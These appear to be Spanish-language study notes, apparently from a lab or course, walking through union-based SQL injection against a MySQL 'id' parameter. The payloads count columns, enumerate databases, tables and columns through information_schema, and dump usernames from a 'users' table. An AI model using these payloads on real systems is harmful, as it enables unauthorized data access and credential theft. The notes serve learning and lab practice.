-- -
Primero empezamos viendo la cantidad de columnas que existen con el uso de order by.
```sql
id=3' order by 100-- -
```

Una vez vimos la cantidad de columnas que existen empezamos con el uso de union select para empezar a ver el contenido almacenado.
```sql
id=3' union select 1
```

Esto nos tendria que mostrar el dato que esta almacenado en la primer columna de la tabla.
Pero si en vez de poner un identificador valido, ponemos unos no valido nos va a empezar a reflejar lo que ponemos, y ahi es cuando podemos  empezar a eejcutar de todo.  
```sql
id=32' union select database();
```

Con este comando le pedimos que nos liste todas las bases de datos existentes.
```sql
id=32' union select schema_name from information_schema.schemata-- -
```

El problema es que a veces los resultados terminan siendo limitados. Para evitar eso es mejor jugar con la funcion group_concat().
```sql
id=32' union select group_concat(schema_name) from information_schema.schemata-- -
```

Luego, para enumerar las tablas de cierta base de datos podriamos ejecutar el siguiente comando.
```sql
id=32' union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u'-- -
```

Luego, tambien para ver las columnas tendriamos q hacer algo muy similiar a lo anterior.
```sql
id=32' union select group_concat(column_name) from information_schema.columns where table_schema='Hack4u' and table_name='users'-- -
```

Para listar los usuarios podemos ejecutar el siguiente comando.
```sql
id=32' union select group_concat(username) from users-- -
```